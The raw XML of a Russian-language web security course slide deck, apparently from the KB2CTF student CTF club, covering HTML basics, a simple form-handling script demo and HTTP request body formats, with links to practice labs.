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</p:sldMasterIdLst>
  <p:notesMasterIdLst>
    <p:notesMasterId r:id="rId114"/>
  </p:notesMasterIdLst>
  <p:sldIdLst>
    <p:sldId id="514" r:id="rId3"/>
    <p:sldId id="257" r:id="rId4"/>
    <p:sldId id="398" r:id="rId5"/>
    <p:sldId id="399" r:id="rId6"/>
    <p:sldId id="400" r:id="rId7"/>
    <p:sldId id="516" r:id="rId8"/>
    <p:sldId id="397" r:id="rId9"/>
    <p:sldId id="266" r:id="rId10"/>
    <p:sldId id="267" r:id="rId11"/>
    <p:sldId id="268" r:id="rId12"/>
    <p:sldId id="269" r:id="rId13"/>
    <p:sldId id="401" r:id="rId14"/>
    <p:sldId id="402" r:id="rId15"/>
    <p:sldId id="403" r:id="rId16"/>
    <p:sldId id="404" r:id="rId17"/>
    <p:sldId id="405" r:id="rId18"/>
    <p:sldId id="406" r:id="rId19"/>
    <p:sldId id="407" r:id="rId20"/>
    <p:sldId id="271" r:id="rId21"/>
    <p:sldId id="356" r:id="rId22"/>
    <p:sldId id="357" r:id="rId23"/>
    <p:sldId id="395" r:id="rId24"/>
    <p:sldId id="394" r:id="rId25"/>
    <p:sldId id="396" r:id="rId26"/>
    <p:sldId id="274" r:id="rId27"/>
    <p:sldId id="280" r:id="rId28"/>
    <p:sldId id="361" r:id="rId29"/>
    <p:sldId id="362" r:id="rId30"/>
    <p:sldId id="365" r:id="rId31"/>
    <p:sldId id="366" r:id="rId32"/>
    <p:sldId id="368" r:id="rId33"/>
    <p:sldId id="275" r:id="rId34"/>
    <p:sldId id="348" r:id="rId35"/>
    <p:sldId id="310" r:id="rId36"/>
    <p:sldId id="309" r:id="rId37"/>
    <p:sldId id="512" r:id="rId38"/>
    <p:sldId id="312" r:id="rId39"/>
    <p:sldId id="391" r:id="rId40"/>
    <p:sldId id="415" r:id="rId41"/>
    <p:sldId id="499" r:id="rId42"/>
    <p:sldId id="469" r:id="rId43"/>
    <p:sldId id="470" r:id="rId44"/>
    <p:sldId id="468" r:id="rId45"/>
    <p:sldId id="471" r:id="rId46"/>
    <p:sldId id="473" r:id="rId47"/>
    <p:sldId id="472" r:id="rId48"/>
    <p:sldId id="289" r:id="rId49"/>
    <p:sldId id="379" r:id="rId50"/>
    <p:sldId id="380" r:id="rId51"/>
    <p:sldId id="382" r:id="rId52"/>
    <p:sldId id="383" r:id="rId53"/>
    <p:sldId id="384" r:id="rId54"/>
    <p:sldId id="387" r:id="rId55"/>
    <p:sldId id="388" r:id="rId56"/>
    <p:sldId id="389" r:id="rId57"/>
    <p:sldId id="474" r:id="rId58"/>
    <p:sldId id="476" r:id="rId59"/>
    <p:sldId id="500" r:id="rId60"/>
    <p:sldId id="294" r:id="rId61"/>
    <p:sldId id="509" r:id="rId62"/>
    <p:sldId id="477" r:id="rId63"/>
    <p:sldId id="297" r:id="rId64"/>
    <p:sldId id="409" r:id="rId65"/>
    <p:sldId id="298" r:id="rId66"/>
    <p:sldId id="299" r:id="rId67"/>
    <p:sldId id="300" r:id="rId68"/>
    <p:sldId id="301" r:id="rId69"/>
    <p:sldId id="302" r:id="rId70"/>
    <p:sldId id="303" r:id="rId71"/>
    <p:sldId id="393" r:id="rId72"/>
    <p:sldId id="372" r:id="rId73"/>
    <p:sldId id="373" r:id="rId74"/>
    <p:sldId id="478" r:id="rId75"/>
    <p:sldId id="501" r:id="rId76"/>
    <p:sldId id="496" r:id="rId77"/>
    <p:sldId id="495" r:id="rId78"/>
    <p:sldId id="497" r:id="rId79"/>
    <p:sldId id="481" r:id="rId80"/>
    <p:sldId id="479" r:id="rId81"/>
    <p:sldId id="482" r:id="rId82"/>
    <p:sldId id="319" r:id="rId83"/>
    <p:sldId id="320" r:id="rId84"/>
    <p:sldId id="480" r:id="rId85"/>
    <p:sldId id="408" r:id="rId86"/>
    <p:sldId id="483" r:id="rId87"/>
    <p:sldId id="427" r:id="rId88"/>
    <p:sldId id="428" r:id="rId89"/>
    <p:sldId id="513" r:id="rId90"/>
    <p:sldId id="484" r:id="rId91"/>
    <p:sldId id="327" r:id="rId92"/>
    <p:sldId id="502" r:id="rId93"/>
    <p:sldId id="486" r:id="rId94"/>
    <p:sldId id="485" r:id="rId95"/>
    <p:sldId id="332" r:id="rId96"/>
    <p:sldId id="333" r:id="rId97"/>
    <p:sldId id="334" r:id="rId98"/>
    <p:sldId id="504" r:id="rId99"/>
    <p:sldId id="489" r:id="rId100"/>
    <p:sldId id="335" r:id="rId101"/>
    <p:sldId id="503" r:id="rId102"/>
    <p:sldId id="490" r:id="rId103"/>
    <p:sldId id="343" r:id="rId104"/>
    <p:sldId id="344" r:id="rId105"/>
    <p:sldId id="505" r:id="rId106"/>
    <p:sldId id="506" r:id="rId107"/>
    <p:sldId id="507" r:id="rId108"/>
    <p:sldId id="508" r:id="rId109"/>
    <p:sldId id="494" r:id="rId110"/>
    <p:sldId id="510" r:id="rId111"/>
    <p:sldId id="352" r:id="rId112"/>
    <p:sldId id="515" r:id="rId113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7070"/>
    <a:srgbClr val="4678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>
        <p:scale>
          <a:sx n="98" d="100"/>
          <a:sy n="98" d="100"/>
        </p:scale>
        <p:origin x="341" y="-6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theme" Target="theme/theme1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tableStyles" Target="tableStyle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presProps" Target="pres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72F866-2EFE-486D-AAC0-87058C8E294E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54794D-2083-4704-9CCD-DAC9702B71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461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  <a:p>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:r>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr/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endParaRPr/>
          </a:p>
          <a:p>
            <a:r>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr/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45666EE-D8D7-4AE9-985F-F4641350B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14EDE9B-B6D3-40D0-8527-B179920AE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B8231DE-0DDB-4723-AB9B-E49E89782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69ADB4D-46EE-44A6-BD09-F5E325A80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C43ED52-2B9B-4246-A944-21F6B21AD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7028B2E-B4D9-4ED7-85E3-95BBF7D43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7D74BFE-05D6-4A51-B1C2-DF02B4E0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D0455017-7FC1-444F-AFF7-97DBF909C1A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CF8BC8-8E2C-4FDB-A473-7DD716CD1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82BF9DC-5FE7-4D9A-97B8-34B403A33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8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61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5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31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296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0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235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60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0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963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465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502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81/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82/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85/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83/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84/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86/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88/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89/" TargetMode="Externa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BTMR/kb2ctf_web_security" TargetMode="External"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://portswigger.net/web-security?utm_source=chatgpt.com" TargetMode="External"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://owasp.org/projects/juice-shop?utm_source=chatgpt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github.com/digininja/DVWA?utm_source=chatgpt.com" TargetMode="External"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://tryhackme.com/?utm_source=chatgpt.com" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.hackthebox.com/?utm_source=chatgpt.com" TargetMode="Externa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9.jpg"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image5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77064796-E72D-45EC-89F9-05B82584A127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8204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52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5250" b="1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Веб-безопасность</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" sz="5250" b="1" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0" dirty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v3-text-1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{61859A5A-C95F-4747-951A-B3E6F64DA7C1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666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KB2CTF</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="v3-box-2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{66D25E48-0A22-49DA-861B-FDBD35928ED2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="3400425"/>
            <a:ext cx="1714500" cy="38100"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="C97070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3DD2287-42D4-425D-921A-E883BEA35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84482ED-1D26-9DC8-902B-8089D2F9D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316" y="-1408009"/>
            <a:ext cx="4414684" cy="826600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32FB73-D7CB-167F-F08A-D06AE7CD19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484" y="2240269"/>
            <a:ext cx="7404306" cy="4936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12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whoami-original-command">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1BB3A074-273C-4442-B1B9-27065D5DCD49}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="504825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3000" b="1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3000" b="1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3000" b="1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3000" b="1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3000" b="1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3000" b="1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3000" b="1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3000" b="1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3000" b="1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3000" b="1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3000" b="1">
                <a:solidFill>
                  <a:srgbClr val="EEF2F6"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>$ whoami</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="whoarewe-command">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{77707A2C-3432-46EB-A2B8-6D04C8A98103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3000" b="1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3000" b="1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3000" b="1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3000" b="1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3000" b="1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3000" b="1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3000" b="1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3000" b="1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3000" b="1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3000" b="1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3000" b="1">
                <a:solidFill>
                  <a:srgbClr val="EEF2F6"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>$ whoarewe</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="whoarewe-shell-error">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0F4CFB75-7031-410B-81FF-819CDB3D31F4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800" b="0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800" b="0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800" b="0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800" b="0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800" b="0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800" b="0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800" b="0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800" b="0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800" b="0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800" b="0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C97070"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>bash: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="C97070"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>whoarewe</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C97070"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>: command not found</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="29" name="whoami-red-strike">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{447334C7-66D3-43ED-9CEC-01D2419281DA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
            <a:stCxn id="26" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="685800" y="742951"/>
            <a:ext cx="1828800" cy="9524"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="42863">
            <a:solidFill>
              <a:srgbClr val="C97070"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="v4-text-139">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{33AF38D8-EBA8-4639-8B66-181600873596}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1975876"/>
            <a:ext cx="5067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3000"/>
              </a:lnSpc>
              <a:buNone/>
              <a:defRPr sz="28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2850" b="1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Катя</a:t>
            </a:r>
            <a:endParaRPr sz="2850" b="1" dirty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F44F94B-3D24-46AD-929E-219DE1643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15" name="v4-text-139">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1E9DE51C-275B-4940-9B5D-7944102D24E3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6249099" y="1975876"/>
            <a:ext cx="5067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3000"/>
              </a:lnSpc>
              <a:buNone/>
              <a:defRPr sz="28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2850" b="1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Саша</a:t>
            </a:r>
            <a:endParaRPr sz="2850" b="1" dirty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3" name="v4-text-140">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C4B1FB92-603E-49FD-B740-A6FAFD521596}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1073441" y="2716380"/>
            <a:ext cx="5067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50000"/>
              </a:lnSpc>
              <a:buNone/>
              <a:defRPr sz="21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2175" b="0" dirty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БББО-22-24</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="ru-RU" sz="2175" b="0" dirty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</a:br>
            <a:r>
              <a:rPr lang="ru-RU" sz="2175" b="0" dirty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Лаборант КБ-2</a:t>
            </a:r>
            <a:endParaRPr sz="2175" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="A9B7C6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AC84D99-FC34-422C-A925-62A692220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85800" y="2757408"/>
            <a:ext cx="426440" cy="42644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B8F52253-E19A-406C-BECC-6A5C90E7E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85800" y="3224876"/>
            <a:ext cx="426440" cy="426440"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="v4-text-140">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7E55143C-4DAE-4E77-B451-AE18A2DDDA0D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6636740" y="2716380"/>
            <a:ext cx="5067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50000"/>
              </a:lnSpc>
              <a:buNone/>
              <a:defRPr sz="21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2175" b="0" dirty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БББО-22-24</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="ru-RU" sz="2175" b="0" dirty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</a:br>
            <a:r>
              <a:rPr lang="ru-RU" sz="2175" b="0" dirty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Лаборант КБ-2</a:t>
            </a:r>
            <a:endParaRPr sz="2175" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="A9B7C6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142CC8BC-CF95-4F64-A850-7EB3B3222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249099" y="2757408"/>
            <a:ext cx="426440" cy="42644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11412FCC-8144-4CD0-B4AB-C7EE64B35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249099" y="3224876"/>
            <a:ext cx="426440" cy="42644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62A92D4-D085-4A2F-89F7-6B0E4C4F09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099" y="3749470"/>
            <a:ext cx="2516549" cy="293708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3A56149-5626-2D03-3084-FB8F05BE4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239" y="3855108"/>
            <a:ext cx="3938722" cy="272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32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HTML: структура веб-страницы</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="FlagIco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969" y="622935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" y="1755648"/>
            <a:ext cx="10817352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HTML (</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0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HyperText</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="25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Markup Language)</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="25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— </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0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это</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="25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стандартный</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="25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язык</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="25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разметки</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="25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веб-страниц</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="25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, </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0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который</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="25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задаёт</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="25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структуру</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="25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документа</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="25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с </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0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помощью</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="25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тегов</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="25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и </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0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определяет</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="25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, </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0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какие</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="25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элементы</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="25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отобразит</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="25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браузер</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="25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3831336"/>
            <a:ext cx="29260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50" b="1" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0" dirty="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:srgbClr val="C97070"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uLnTx/>
              <a:uFillTx/>
              <a:latin typeface="DejaVu Sans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05256" y="4288536"/>
            <a:ext cx="2926080" cy="12161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31436" y="3831336"/>
            <a:ext cx="29260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DejaVu Sans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631436" y="4288536"/>
            <a:ext cx="2926080" cy="12161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357616" y="3831336"/>
            <a:ext cx="29260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50" b="1" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0" dirty="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:srgbClr val="C97070"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uLnTx/>
              <a:uFillTx/>
              <a:latin typeface="DejaVu Sans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57616" y="4288536"/>
            <a:ext cx="2926080" cy="12161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581009"/>
            <a:ext cx="10820369" cy="9239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HTML: структура документа</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="FlagIco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969" y="622935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" y="1828800"/>
            <a:ext cx="5065776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Минимальный HTML-документ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59152"/>
            <a:ext cx="5065776" cy="3337560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="10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8680" y="2542032"/>
            <a:ext cx="4700016" cy="2971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&lt;!DOCTYPE html&gt;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html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lang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"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ru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"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head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meta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charset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"UTF-8"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title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KB2CTF Lab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&lt;/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title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&lt;/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head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body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h1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Вход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в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систему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&lt;/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h1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id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"user"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Привет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,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alex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!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&lt;/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&lt;/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body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&lt;/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html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6437376" y="1828800"/>
            <a:ext cx="5065776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Основные разделы разметки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7376" y="2359152"/>
            <a:ext cx="5065776" cy="1691640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="10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20256" y="2542032"/>
            <a:ext cx="4700016" cy="1325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document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└── &lt;html&gt; (корневой тег)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├── &lt;head&gt; (метаданные, стили)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└── &lt;body&gt; (видимый контент)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7376" y="4224528"/>
            <a:ext cx="5065776" cy="1508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1. &lt;!DOCTYPE html&gt;: </a:t>
            </a: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указывает стандарт HTML5</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0" algn="l" defTabSz="9144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2. Блок &lt;head&gt;: </a:t>
            </a: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кодировка, заголовок вкладки и CSS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0" algn="l" defTabSz="9144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3. Блок &lt;body&gt;: </a:t>
            </a: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всё, что видит пользователь в окне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581009"/>
            <a:ext cx="10820369" cy="9239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HTML: основные теги и атрибуты</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="FlagIco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969" y="6229350"/>
            <a:ext cx="457200" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="editable-code-10-9">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A85E5179-B81F-44EB-85FA-826AF34D8C2A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="508635" y="2038350"/>
            <a:ext cx="5429250" cy="419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&lt;!DOCTYPE html&gt;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&lt;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html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lang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=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"ru"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&lt;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head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&gt;&lt;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meta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charset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=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"utf-8"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&gt;&lt;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title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Пример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&lt;/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title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&gt;&lt;/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head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&lt;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body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&lt;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h1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Заголовок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&lt;/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h1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&lt;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p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Абзац текста с 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&lt;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a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href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=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"https://www.google.com/"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ссылкой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&lt;/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a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.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&lt;/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p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&lt;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img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src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=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"https://via.placeholder.com/50"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alt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=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"Картинка"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73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&lt;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form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id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=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"f"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    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&lt;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input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type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=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"text"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name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=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"username"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value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=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"admin"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    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&lt;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button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type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=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"submit"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Отправить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&lt;/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button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&lt;/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form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73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&lt;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script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    document.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getElementById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'f'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).onsubmit = (e) =&gt; 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        e.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preventDefault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();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        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alert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'Форма перехвачена скриптом!'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    };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&lt;/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script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&lt;/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body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7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&lt;/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html</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="1073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&gt;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71803FA-20F6-97AE-FD37-5ECA55BB8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2363000"/>
            <a:ext cx="5712247" cy="29218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1630560"/>
            <a:ext cx="1333500" cy="38100"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="D47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85800" y="3055590"/>
            <a:ext cx="2423814" cy="1777305"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5359"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1E2733"/>
          </a:solidFill>
          <a:ln w="19050">
            <a:solidFill>
              <a:srgbClr val="D472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262014" y="3055590"/>
            <a:ext cx="1946671" cy="1777305"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5359"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B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361086" y="3055590"/>
            <a:ext cx="1946671" cy="1777305"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5359"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B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60158" y="3055590"/>
            <a:ext cx="1946671" cy="1777305"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5359"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B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559230" y="3055590"/>
            <a:ext cx="1946671" cy="1777305"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5359"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B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95350" y="3303240"/>
            <a:ext cx="511968" cy="200025"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 19047"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="D47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300787"/>
            <a:ext cx="1524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564" y="3327052"/>
            <a:ext cx="1905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3411" y="3288952"/>
            <a:ext cx="1238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533" y="3288952"/>
            <a:ext cx="10477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1555" y="3288952"/>
            <a:ext cx="12382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10627" y="3288952"/>
            <a:ext cx="123825" cy="142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533400"/>
            <a:ext cx="11506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D4726E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KB2CTF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952500"/>
            <a:ext cx="11506200" cy="525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1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Форматы тела HTTP-запроса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6025"/>
            <a:ext cx="565546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8798AD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Первый и основной формат для разбора — </a:t>
            </a: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JSON</a:t>
            </a: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8798AD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 (Слайды 12–13)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50" y="4198590"/>
            <a:ext cx="2099964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C5D0DE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Сохраняет строгие типы: int, bool, list, dict, null.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3464" y="4084587"/>
            <a:ext cx="1699021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9CB1C9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Пары ключ=значение через &amp;. Все значения — только строки (str).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536" y="4084587"/>
            <a:ext cx="1699021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9CB1C9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Бинарные файлы с разделителями boundary. Векторы Path Traversal.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1608" y="4084587"/>
            <a:ext cx="1699021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9CB1C9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Сырая монолитная строка без схемы полей и ключей.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0680" y="4084587"/>
            <a:ext cx="1699021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9CB1C9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Дерево кастомных тегов, атрибуты и строгий синтаксис (XXE).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" y="3636615"/>
            <a:ext cx="263118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3941415"/>
            <a:ext cx="25058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D4726E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application/json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33464" y="3569940"/>
            <a:ext cx="21049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Form URL-Encoded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33464" y="3827115"/>
            <a:ext cx="200471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25" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="8798AD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x-www-form-urlencoded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536" y="3569940"/>
            <a:ext cx="21049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Multipart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536" y="3827115"/>
            <a:ext cx="200471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25" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="8798AD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multipart/form-data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1608" y="3569940"/>
            <a:ext cx="21049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Text Plain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1608" y="3827115"/>
            <a:ext cx="200471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25" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="8798AD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text/plain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0680" y="3569940"/>
            <a:ext cx="21049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XML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0680" y="3827115"/>
            <a:ext cx="200471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25" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="8798AD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application/xml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550" y="3331815"/>
            <a:ext cx="454818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25" b="1" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="161C24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ДАЛЕЕ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3464" y="3284190"/>
            <a:ext cx="4191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8798AD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536" y="3284190"/>
